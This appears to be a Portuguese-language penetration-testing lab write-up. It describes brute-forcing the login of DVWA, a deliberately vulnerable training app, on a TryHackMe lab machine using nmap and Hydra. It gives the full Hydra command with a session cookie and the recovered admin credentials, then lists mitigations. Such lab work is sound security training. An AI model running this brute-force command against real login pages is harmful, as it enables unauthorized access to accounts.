🔐 DVWA Bruteforce Hydra Lab

Projeto prático de teste de intrusão em aplicação web, explorando falhas de autenticação por meio de ataque de força bruta com a ferramenta Hydra.

---

📌 Descrição

Este projeto demonstra a execução de um ataque de força bruta na aplicação vulnerável DVWA (Damn Vulnerable Web Application).

O objetivo foi identificar credenciais válidas explorando a ausência de mecanismos de proteção contra múltiplas tentativas de autenticação, evidenciando riscos reais de comprometimento do sistema.

---

🧠 Ambiente Utilizado

Devido à limitação de hardware (uso de dispositivo móvel), o ambiente foi adaptado:

- 🎯 Alvo: DVWA
- 📱 Dispositivo: Android
- 🌐 Plataforma: TryHackMe
- 🔐 VPN: OpenVPN (TryHackMe)
- 🖥️ Ambiente Linux: UserLAnd (Ubuntu)

---

🛠️ Ferramentas Utilizadas

- Nmap → Enumeração de portas e serviços
- Hydra → Ataque de força bruta em formulário web
- Kiwi Browser (DevTools) → Análise de requisições HTTP e cookies

---

🔍 Enumeração

Identificação de serviços ativos no alvo:

nmap -sV -sC 10.65.142.185

Resultados relevantes:

- Porta 22 (SSH) aberta
- Porta 80 (HTTP) aberta

---

🌐 Acesso à Aplicação

A aplicação DVWA foi acessada via navegador:

http://10.65.142.185

---

⚔️ Ataque de Força Bruta

O ataque foi realizado no módulo:

/vulnerabilities/brute/

---

🍪 Uso de Cookie de Sessão

Para execução correta do ataque, foi necessário utilizar um cookie de sessão válido:

PHPSESSID=out1ugcuu8ubjbgsdhu1e5mq77; security=low

---

💻 Comando Utilizado

hydra -l admin -P senhas.txt 10.65.142.185 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=out1ugcuu8ubjbgsdhu1e5mq77; security=low"

---

✅ Resultado

Credencial válida identificada com sucesso:

- Login: "admin"
- Senha: "password"

---

⚠️ Vulnerabilidades Identificadas

- Exposição a ataques de força bruta
- Ausência de autentação multifator (MFA)
- Falta de limitação de tentativas de login
- Exposição de informações em cabeçalhos HTTP
- Uso de HTTP sem criptografia

---

🛡️ Medidas de Mitigação

- Implementar limitação de tentativas de login
- Adotar autenticação multifator (MFA)
- Configurar cookies com atributos de segurança (HttpOnly e Secure)
- Utilizar HTTPS para proteger dados em trânsito
- Monitorar atividades suspeitas

---

📊 Conclusão

O teste de intrusão evidenciou falhas críticas no mecanismo de autenticação, permitindo a obtenção de credenciais válidas por meio de ataque automatizado.

Também foram identificadas fragilidades na configuração da aplicação, incluindo exposição de informações sensíveis e ausência de criptografia nas comunicações.

---

🚀 Observação Final

Este projeto foi desenvolvido integralmente em ambiente mobile, demonstrando a viabilidade de execução de testes de segurança mesmo com recursos limitados.

---

👩‍💻 Autora

Kelwri Jheine
